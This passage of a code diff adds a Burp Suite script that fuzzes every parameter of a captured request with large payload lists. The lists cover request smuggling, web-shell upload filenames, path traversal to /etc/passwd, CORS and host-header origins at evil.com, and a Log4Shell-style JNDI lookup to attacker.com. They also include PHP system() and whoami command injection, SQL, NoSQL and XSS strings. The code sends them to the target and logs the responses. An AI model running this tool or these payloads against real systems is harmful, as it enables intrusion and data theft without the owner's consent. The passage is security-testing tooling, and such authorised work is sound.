+    "Content-Length:+6\\r\\nTransfer-Encoding:+chunked\\r\\n\\r\\n0\\r\\n\\r\\nG",
+    
+    // TE.CL (Transfer-Encoding to Content-Length)
+    "Transfer-Encoding:+chunked\\r\\nContent-Length:+4\\r\\n\\r\\n5c\\r\\nGPOST+/+HTTP/1.1\\r\\nHost:+vulnerable.com\\r\\n\\r\\n0\\r\\n\\r\\n",
+    
+    // TE.TE (Transfer-Encoding to Transfer-Encoding)
+    "Transfer-Encoding:+chunked\\r\\nTransfer-Encoding:+x\\r\\n\\r\\n",
+    
+    // Obfuscated Transfer-Encoding
+    "Transfer-Encoding:+chunked\\r\\nTransfer-Encoding:+cow\\r\\n\\r\\n",
+    "Transfer-Encoding:+chunked\\r\\nTransfer-encoding:+identity\\r\\n\\r\\n",
+    "Transfer-Encoding:+chunked\\r\\nTransfer-Encoding:+x\\r\\nTransfer-Encoding:+chunked\\r\\n\\r\\n",
+    
+    // Header variations
+    "Transfer-Encoding:+chunked\\r\\nX:+X[\\r\\n]Transfer-Encoding:+chunked\\r\\n\\r\\n",
+    "Transfer-Encoding:[tab]chunked\\r\\n\\r\\n"
+};
+
+// 10c. Race Conditions (TOCTOU - Time Of Check Time Of Use)
+String[] RACE_CONDITION_PAYLOADS = {
+    // Note: Race conditions require SIMULTANEOUS requests, not sequential
+    // These payloads represent common race condition scenarios
+    // Actual implementation requires sending multiple identical/similar requests simultaneously
+    
+    // Coupon/Promo code reuse
+    "PROMO2024",
+    "DISCOUNT50",
+    "FREESHIP",
+    "WELCOME10",
+    
+    // Parallel redemption values
+    "1",  // Redeem 1 unit multiple times in parallel
+    "100",
+    "999",
+    
+    // Account balance manipulation
+    "withdraw:100",
+    "transfer:100",
+    "debit:100",
+    
+    // Resource limit bypass (e.g., download limits, API rate limits)
+    // Send same request ID multiple times simultaneously
+    "resource-id-123",
+    "download-token-abc",
+    
+    // Vote/Like manipulation
+    "vote:up",
+    "like:1",
+    "upvote:true",
+    
+    // Account creation with same username/email
+    "user@example.com",
+    "testuser",
+    "admin",
+    
+    // Payment processing race
+    "payment-id-123",
+    "transaction-456",
+    "order-789",
+    
+    // File upload race (filename collision)
+    "upload.php",
+    "shell.php",
+    
+    // Session race (session fixation)
+    "session-token-abc123",
+    
+    // Inventory race (purchasing limited stock)
+    "product-id-1",
+    "item-limited-edition",
+    
+    // Booking race (seat/room reservation)
+    "seat-1A",
+    "room-101",
+    
+    // TOCTOU for file operations
+    "/tmp/race-file",
+    "../../../etc/passwd",
+    
+    // Privilege escalation race
+    "role:admin",
+    "privilege:superuser",
+    
+    // Multi-factor auth bypass via race
+    "mfa-token-123",
+    "otp-verify",
+    
+    // Password reset race
+    "reset-token-abc",
+    
+    // Referral/Reward abuse
+    "referral-code-XYZ",
+    "reward-points:1000",
+    
+    // Database transaction race
+    "transaction-begin",
+    "transaction-commit"
+};
+
+// 4k. File Upload Bypass
+String[] FILE_UPLOAD_PAYLOADS = {
+    // Double extensions
+    "shell.php.jpg",
+    "shell.php.png",
+    "shell.php.gif",
+    "shell.jpg.php",
+    "shell.png.php",
+    
+    // Null byte injection
+    "shell.php%00.jpg",
+    "shell.php\\x00.jpg",
+    
+    // Case sensitivity
+    "shell.PhP",
+    "shell.pHp",
+    "shell.PHP",
+    
+    // Alternative extensions
+    "shell.php3",
+    "shell.php4",
+    "shell.php5",
+    "shell.phtml",
+    "shell.pht",
+    "shell.phps",
+    "shell.asp",
+    "shell.aspx",
+    "shell.jsp",
+    "shell.jspx",
+    
+    // .htaccess
+    ".htaccess",
+    
+    // Special chars
+    "shell.php.",
+    "shell.php..",
+    "shell.php....",
+    "shell.php%20",
+    "shell.php::$DATA"
+};
+
+// 4l. Business Logic Testing
+String[] BUSINESS_LOGIC_PAYLOADS = {
+    // Negative quantities
+    "-1",
+    "-999",
+    "-9999999",
+    
+    // Overflow values
+    "2147483648",
+    "9999999999999999999",
+    
+    // Price manipulation
+    "0",
+    "0.01",
+    "-1.00",
+    "-100",
+    
+    // Coupon/Discount codes
+    "FREESHIP",
+    "100OFF",
+    "DISCOUNT",
+    "TEST",
+    "ADMIN",
+    
+    // Boolean bypass
+    "true",
+    "false",
+    "1",
+    "0",
+    
+    // Status manipulation
+    "completed",
+    "cancelled",
+    "refunded",
+    "approved",
+    "pending"
+};
+
+// 4m. Unicode Normalization
+String[] UNICODE_NORMALIZATION_PAYLOADS = {
+    // Homoglyph attacks
+    "admin",  // Regular
+    "\u0430dmin",  // Cyrillic 'a'
+    "adm\u0456n",  // Cyrillic 'i'
+    "\u03BFpen",  // Greek 'o'
+    
+    // Zero-width characters
+    "ad\\u200Bmin",  // Zero-width space
+    "ad\\u200Cmin",  // Zero-width non-joiner
+    "ad\\uFEFFmin",  // Zero-width no-break space
+    
+    // Overlong UTF-8
+    "%C0%AE%C0%AE/",
+    "%E0%80%AE%E0%80%AE/",
+    
+    // Mixed scripts
+    "\u0073\u0063\u0072\u0131\u0070\u0074",  // 'script' with Turkish dotless i
+    
+    // Right-to-left override
+    "\\u202Eadmin"
+};
+
+// ============================================================
+// CATEGORY 7: HTTP PROTOCOL & METHODS
+// ============================================================
+
+// 7a. HTTP Methods to Test
+String[] HTTP_METHODS_TO_TEST = {
+    "OPTIONS",
+    "TRACE",
+    "DELETE",
+    "PUT",
+    "PATCH",
+    "CONNECT",
+    "HEAD",
+    "PROPFIND",
+    "PROPPATCH",
+    "MKCOL",
+    "COPY",
+    "MOVE",
+    "LOCK",
+    "UNLOCK"
+};
+
+// 7c. URL Manipulation
+String[] URL_MANIPULATION_PAYLOADS = {
+    "../",
+    "..%2f",
+    "..%252f",
+    "%2e%2e%2f",
+    "....//",
+    "..\\",
+    "..%5c",
+    "/admin",
+    "/admin/",
+    "/.git/",
+    "/.env",
+    "/config/",
+    "/api/v1/admin",
+    "/api/internal",
+    "/debug",
+    "/test",
+    "/swagger.json",
+    "/api-docs",
+    "/graphql"
+};
+
+// ============================================================
+// CATEGORY 8: CONTENT TYPE & HEADERS  
+// ============================================================
+
+// 8a. Content-Type Bypass
+String[] CONTENT_TYPE_BYPASS_HEADERS = {
+    "application/json",
+    "application/xml",
+    "text/xml",
+    "application/x-www-form-urlencoded",
+    "multipart/form-data",
+    "text/plain",
+    "text/html",
+    "application/javascript",
+    "*/*",
+    "application/json;+charset=UTF-8",
+    "application/xml;+charset=UTF-8"
+};
+
+// 8b. CORS Bypass
+String[] CORS_BYPASS_HEADERS = {
+    "Origin: https://evil.com",
+    "Origin: null",
+    "Origin: https://attacker.com",
+    "Origin: file://",
+    "Origin: http://localhost",
+    "Origin: https://trusted.com.evil.com",
+    "Origin: https://trustedcom.evil.com"
+};
+
+// 8c. Host Header Injection
+String[] HOST_HEADER_PAYLOADS = {
+    "evil.com",
+    "localhost",
+    "127.0.0.1",
+    "evil.com:80",
+    "evil.com:443",
+    "[::1]",
+    "evil.com%00.legitimate.com",
+    "evil.com%20.legitimate.com",
+    "evil.com#.legitimate.com",
+    "169.254.169.254",
+    "metadata.google.internal"
+};
+
+// 8d. Cache Poisoning Headers
+String[] CACHE_POISONING_HEADERS = {
+    "X-Forwarded-Host",
+    "X-Host",
+    "X-Forwarded-Server",
+    "X-HTTP-Host-Override",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "X-Forwarded-For",
+    "X-Real-IP",
+    "True-Client-IP",
+    "X-Originating-IP"
+};
+
+// ============================================================
+// CATEGORY 9: SECURITY HEADERS & CONFIGURATION
+// ============================================================
+
+// 9a. Security Headers to Check
+String[] SECURITY_HEADERS_TO_CHECK = {
+    "X-Content-Type-Options",
+    "X-Frame-Options",
+    "Content-Security-Policy",
+    "X-Powered-By",
+    "Server",
+    "X-AspNet-Version",
+    "X-AspNetMvc-Version",
+    "Strict-Transport-Security",
+    "X-XSS-Protection",
+    "Access-Control-Allow-Origin",
+    "Access-Control-Allow-Credentials"
+};
+
+// 9b. Sensitive Data Patterns
+String[] SENSITIVE_DATA_PATTERNS = {
+    "password",
+    "passwd",
+    "secret",
+    "api_key",
+    "apikey",
+    "api-key",
+    "access_token",
+    "accesstoken",
+    "private_key",
+    "privatekey",
+    "credential",
+    "auth_token",
+    "session_id",
+    "sessionid",
+    "jwt",
+    "bearer"
+};
+
+// 9c. Cookie Security Attributes
+String[] COOKIE_ATTRIBUTES_TO_CHECK = {
+    "Secure",
+    "HttpOnly",
+    "SameSite",
+    "Path",
+    "Domain",
+    "Expires",
+    "Max-Age"
+};
+
+// 8b. Advanced CORS Misconfiguration Payloads
+String[] ADVANCED_CORS_PAYLOADS = {
+    // Null origin exploitation
+    "null",
+    
+    // Arbitrary origin reflection (test if server reflects any origin)
+    "http://evil.com",
+    "https://evil.com",
+    "http://attacker.com",
+    
+    // Subdomain wildcard exploitation
+    "http://evil.legitimate-site.com",
+    "http://legitimate-site.com.evil.com",
+    
+    // HTTPS to HTTP downgrade
+    "http://legitimate-site.com",
+    
+    // Port manipulation
+    "https://legitimate-site.com:8080",
+    "https://legitimate-site.com:4444",
+    
+    // Protocol manipulation
+    "file://",
+    "data://",
+    
+    // Localhost/Internal origins
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://[::1]",
+    
+    // Pre-domain wildcard
+    "http://evillegitimate-site.com",
+    "http://www.evil.com",
+    
+    // Post-domain wildcard
+    "http://legitimate-siteevil.com",
+    
+    // Underscore in domain
+    "http://evil_subdomain.legitimate-site.com",
+    
+    // Special characters
+    "http://legitimate-site.com%60.evil.com",
+    "http://legitimate-site.com%00.evil.com",
+    
+    // JavaScript protocol
+    "javascript:alert(document.domain)",
+    
+    // Backticks
+    "`http://evil.com`"
+};
+
+// 8d. Cache Poisoning Payloads (Unkeyed Headers)
+String[] CACHE_POISONING_PAYLOADS = {
+    // X-Forwarded-Host manipulation
+    "X-Forwarded-Host:+evil.com",
+    "X-Forwarded-Host:+attacker.com",
+    "X-Forwarded-Host:+localhost",
+    
+    // X-Original-URL / X-Rewrite-URL manipulation
+    "X-Original-URL:+/admin",
+    "X-Rewrite-URL:+/admin",
+    "X-Original-URL:+/../../admin",
+    
+    // X-Forwarded-Scheme manipulation
+    "X-Forwarded-Scheme:+http",
+    "X-Forwarded-Scheme:+nothttps",
+    
+    // X-Forwarded-Server manipulation
+    "X-Forwarded-Server:+evil.com",
+    "X-Forwarded-Server:+attacker.com",
+    
+    // X-Host manipulation
+    "X-Host:+evil.com",
+    
+    // Forwarded header (RFC 7239)
+    "Forwarded:+host=evil.com",
+    "Forwarded:+proto=http",
+    
+    // X-Forwarded-Prefix manipulation
+    "X-Forwarded-Prefix:+/evil",
+    
+    // X-Original-Host manipulation
+    "X-Original-Host:+evil.com",
+    
+    // True-Client-IP manipulation
+    "True-Client-IP:+127.0.0.1",
+    
+    // X-WAP-Profile for SSRF
+    "X-Wap-Profile:+http://attacker.com/xxe.xml",
+    
+    // Via header manipulation
+    "Via:+injected-proxy",
+    
+    // X-HTTP-Method-Override for cache key confusion
+    "X-HTTP-Method-Override:+GET",
+    
+    // Accept-Language for cache poisoning
+    "Accept-Language:+en-US,+en;q=0.9<script>alert(1)</script>",
+    
+    // Accept-Encoding variations
+    "Accept-Encoding:+gzip,+deflate,+br,+evil",
+    
+    // User-Agent with XSS
+    "User-Agent:+<script>alert(1)</script>",
+    
+    // Cookie-based cache poisoning
+    "Cookie:+utm_source=<script>alert(1)</script>"
+};
+
+// 8e. Log Injection / Log Forging Payloads
+String[] LOG_INJECTION_PAYLOADS = {
+    // CRLF in logs
+    "test%0d%0aINFO:+Fake+log+entry",
+    "test%0aERROR:+Injected+error",
+    "test\\r\\nWARNING:+Injected+warning",
+    "user\\nADMIN+logged+in+successfully",
+    
+    // Log level manipulation
+    "test%0d%0a[CRITICAL]+Fake+critical+error",
+    "test%0a[ERROR]+Fake+error+message",
+    "test%0a[INFO]+admin+logged+in",
+    
+    // SIEM bypass
+    "test%0d%0a%0d%0a[2024-01-01+00:00:00]+INFO:+Legitimate+entry",
+    
+    // Log poisoning for RCE (if logs are processed)
+    "<?php+system('id');+?>",
+    "${jndi:ldap://attacker.com/a}",
+    "test%0a<?php+system('whoami');+?>",
+    
+    // ANSI escape code injection
+    "test\\x1b[31mRED+TEXT\\x1b[0m",
+    "test\\033[1;31mERROR\\033[0m",
+    
+    // Null byte injection in logs
+    "test%00INJECTED",
+    
+    // JSON log injection
+    "\",\"level\":\"ERROR\",\"message\":\"Injected",
+    "{\"user\":\"test\",\"action\":\"logout\"},+{\"user\":\"admin\",\"action\":\"login\"}",
+    
+    // XML log injection
+    "</log><log><level>ERROR</level><message>Injected</message></log>",
+    
+    // Stack trace injection
+    "test\\n\\tat+java.lang.Thread.run(Thread.java:fake)",
+    "test%0aException+in+thread+\\\"main\\\"+java.lang.RuntimeException",
+    
+    // Timestamp manipulation
+    "test%0a2024-01-01+00:00:00+[ERROR]+Injected",
+    
+    // Multi-line log injection
+    "test\\nINFO:+User+created\\nINFO:+Admin+privileges+granted",
+    
+    // Script injection in logs (if logs viewed in web interface)
+    "test<script>alert(document.cookie)</script>",
+    "test%0a<img+src=x+onerror=alert(1)>"
+};
+
+// 9d. WebSocket Security Testing Payloads
+String[] WEBSOCKET_PAYLOADS = {
+    // Note: These are conceptual - actual WebSocket testing requires different approach
+    // Testing for CSWSH (Cross-Site WebSocket Hijacking)
+    
+    // Origin header manipulation (test if server validates Origin)
+    "http://evil.com",
+    "http://attacker.com",
+    "null",
+    "http://localhost",
+    
+    // Message injection payloads
+    "{\"type\":\"admin\",\"action\":\"delete\"}",
+    "{\"user\":\"admin\",\"privilege\":\"superuser\"}",
+    
+    // XSS in WebSocket messages
+    "<script>alert(1)</script>",
+    "{\"message\":\"<img src=x onerror=alert(1)>\"}",
+    
+    // SQL injection in WebSocket
+    "' OR '1'='1",
+    "{\"query\":\"' UNION SELECT * FROM users--\"}",
+    
+    // Command injection
+    "; whoami",
+    "{\"cmd\":\"$(whoami)\"}",
+    
+    // NoSQL injection
+    "{\"$gt\":\"\"}",
+    "{\"user\":{\"$ne\":null}}",
+    
+    // JSON injection
+    "\",\"admin\":true,\"x\":\"",
+    
+    // Prototype pollution
+    "{\"__proto__\":{\"admin\":true}}",
+    
+    // Large payload (DoS)
+    "A" + "A".repeat(1000000),  // Conceptual - actual implementation would differ
+    
+    // Message type confusion
+    "{\"type\":\"ping\"}",
+    "{\"type\":\"pong\"}",
+    "{\"type\":\"authentication\"}",
+    
+    // Binary frame injection
+    "\\x00\\x01\\x02\\xFF",
+    
+    // Frame fragmentation abuse
+    // Note: This requires low-level WebSocket manipulation
+    
+    // Sec-WebSocket-Protocol manipulation
+    "protocol1, protocol2, malicious-protocol"
+};
+
+// ============================================================
+// HELPER FUNCTION: URL Encode payload based on parameter type
+// Defined as a BiFunction since Bambda does not allow standalone methods
+// ============================================================
+java.util.function.BiFunction<String, burp.api.montoya.http.message.params.HttpParameterType, String> encodePayload = (payload, paramType) -> {
+    try {
+        if (paramType == burp.api.montoya.http.message.params.HttpParameterType.URL) {
+            return java.net.URLEncoder.encode(payload, "UTF-8");
+        }
+        return payload;
+    } catch (Exception e) {
+        logging().logToError("Error encoding payload: " + e.getMessage());
+        return payload;
+    }
+};
+
+// ============================================================
+// GET REQUEST AND SERVICE INFORMATION
+// ============================================================
+var originalRequest = requestResponse.request();
+var httpService = requestResponse.httpService();
+
+// Extract all parameters based on request type
+java.util.List<burp.api.montoya.http.message.params.HttpParameter> allParams = new java.util.ArrayList<>();
+
+// Add URL parameters (GET)
+allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.URL));
+
+// Add body parameters (POST)
+allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.BODY));
+
+// Add JSON Parameters 
+allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.JSON));
+
+// Add XML Parameters (if available)
+// allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.XML));
+
+// ------------------------------------------------------------ //
+// -- Uncomment below line to fuzz cookie parameters as well -- //
+// allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.COOKIE));
+// ------------------------------------------------------------ //
+
+if (allParams.isEmpty()) {
+    logging().logToOutput("No parameters found to fuzz");
+}
+
+logging().logToOutput("[ ======================================= ]");
+logging().logToOutput("API SECURITY TESTING STARTED");
+logging().logToOutput("Found " + allParams.size() + " parameters to test");
+logging().logToOutput("Target: " + httpService.host() + ":" + httpService.port());
+logging().logToOutput("[ ======================================= ]");
+logging().logToOutput("CHECK ORGANIZER TAB FOR OUTPUT");
+logging().logToOutput("[ ======================================= ]");
+
+// Counter for tracking total requests
+int totalRequests = 0;
+StringBuilder results = new StringBuilder();
+results.append("API SECURITY TESTING RESULTS SUMMARY:\n\n");
+
+// ############################################################
+// ############################################################
+// ##                                                        ##
+// ##  PART 1: PARAMETER-BASED TESTS EXECUTION              ##
+// ##  (Run for EACH parameter found in the request)        ##
+// ##                                                        ##
+// ############################################################
+// ############################################################
+
+for (burp.api.montoya.http.message.params.HttpParameter param : allParams) {
+    String paramName = param.name();
+    String originalValue = param.value();
+
+    logging().logToOutput("\n[ === Testing Parameter: " + paramName + " (original: '" + originalValue + "') === ]");
+    results.append("Parameter: " + paramName + " (Type: " + param.type() + ")\n");
+    results.append("Original Value: " + originalValue + "\n");
+    logging().logToOutput("[ ======================================= ]\n");
+
+    // ============================================================
+    // CATEGORY 1: INPUT FUZZING
+    // ============================================================
+    
+    // 1a. Numeric Fuzzing
+    logging().logToOutput("[ === Category 1a: Numeric Input Fuzzing === ]");
+    for (String numPayload : NUMERIC_FUZZING_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, numPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat1a] Numeric Fuzzing: '" + numPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Numeric Fuzzing '" + numPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 1b. String Fuzzing
+    logging().logToOutput("[ === Category 1b: String Input Fuzzing === ]");
+    for (String strPayload : STRING_FUZZING_PAYLOADS) {
+        String newValue = originalValue + strPayload;
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, newValue, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat1b] String Fuzzing: '" + strPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with String Fuzzing '" + strPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // CATEGORY 2: INJECTION ATTACKS
+    // ============================================================
+
+    // 2a. SQL Injection
+    logging().logToOutput("[ === Category 2a: SQL Injection === ]");
+    for (String sqliPayload : SQLI_PAYLOADS) {
+        String newValue = originalValue + sqliPayload;
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, newValue, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2a] SQL Injection: '" + sqliPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with SQL Injection '" + sqliPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 2b. OS Command Injection
+    logging().logToOutput("[ === Category 2b: OS Command Injection === ]");
+    for (String cmdPayload : OS_COMMAND_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, cmdPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2b] OS Command Injection: '" + cmdPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with OS Command Injection '" + cmdPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 2c. LDAP Injection
+    logging().logToOutput("[ === Category 2c: LDAP Injection === ]");
+    for (String ldapPayload : LDAP_INJECTION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, ldapPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2c] LDAP Injection: '" + ldapPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with LDAP Injection '" + ldapPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 2d. XPath Injection
+    logging().logToOutput("[ === Category 2d: XPath Injection === ]");
+    for (String xpathPayload : XPATH_INJECTION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, xpathPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2d] XPath Injection: '" + xpathPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with XPath Injection '" + xpathPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 2e. Code Injection
+    logging().logToOutput("[ === Category 2e: Code Injection === ]");
+    for (String codePayload : CODE_INJECTION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, codePayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2e] Code Injection: '" + codePayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Code Injection '" + codePayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // Category 3: Authorization - IDOR Tests
+    // ============================================================
+    logging().logToOutput("[ === Category 3a: IDOR/Authorization Tests === ]");
+    for (String idorPayload : IDOR_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, idorPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat3a] IDOR Payload: '" + idorPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with IDOR Payload '" + idorPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // Category 4: Input Validation - XSS Tests
+    // ============================================================
+    logging().logToOutput("[ === Category 4a: XSS Tests === ]");
+    for (String xssPayload : XSS_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, xssPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4a] XSS Payload: '" + xssPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with XSS Payload '" + xssPayload + "': " + e.getMessage());
+        }
+    }
+
+    // Parameter Pollution Tests
+    logging().logToOutput("[ === Category 4b: Parameter Pollution Tests === ]");
+    for (String hppPayload : PARAMETER_POLLUTION_PAYLOADS) {
+        String newValue = originalValue + hppPayload;
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, newValue, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4b] Parameter Pollution: '" + hppPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Parameter Pollution '" + hppPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 4c. JSON Injection Tests
+    logging().logToOutput("[ === Category 4c: JSON Injection Tests === ]");
+    for (String jsonPayload : JSON_INJECTION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, jsonPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4c] JSON Injection: '" + jsonPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with JSON Injection '" + jsonPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 4d. NoSQL Injection Tests
+    logging().logToOutput("[ === Category 4d: NoSQL Injection Tests === ]");
+    for (String nosqlPayload : NOSQL_INJECTION_PAYLOADS) {
+        String newValue = originalValue + nosqlPayload;
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, newValue, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4d] NoSQL Injection: '" + nosqlPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with NoSQL Injection '" + nosqlPayload + "': " + e.getMessage());
+        }
+    }
+
+    // 4e. XXE Injection Tests
+    logging().logToOutput("[ === Category 4e: XXE Injection Tests === ]");
+    for (String xxePayload : XXE_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, xxePayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4e] XXE Injection: '" + xxePayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with XXE Injection '" + xxePayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 2f. SSRF (Server-Side Request Forgery)
+    // ============================================================
+    logging().logToOutput("[ === Category 2f: SSRF Tests === ]");
+    for (String ssrfPayload : SSRF_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
